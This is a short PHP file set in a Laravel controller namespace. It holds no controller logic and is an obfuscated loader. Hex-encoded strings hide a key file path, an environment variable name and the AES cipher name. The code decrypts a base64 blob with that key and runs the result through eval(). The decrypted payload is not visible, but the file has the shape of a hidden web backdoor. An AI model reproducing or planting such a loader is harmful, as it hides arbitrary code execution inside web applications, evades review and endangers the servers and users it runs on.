<?php
namespace App\Http\Controllers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('zCgCBEr24tJe8k5XyT5gfA==');

$c=base64_decode(

'5B62MHczyIUYmutbv1ynKCdKhDC5Ni0RE7eueHL2QKzT2oFYcGqlzKc5eqQQM5kqD5IHDmt0YCRv' .
'jV9Ls7P9Dl++YewqTHeMcUKFI596c6G8noCmfSZLW3sio6v8jcVaMoupvUAg7BcqKk8Xm0DIZBh5' .
'Rx/AMWRiDFRz6DXYevIycq5lOnuZegPTHIH3tFANcIorqGG2XTAC0yCyWgxa6qgz4sVX14Fq1/ae' .
'aKwQme1PF2a7/3eH43592MpC4TEXVyRvfnnDnawLC8IKqWMQKQ=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

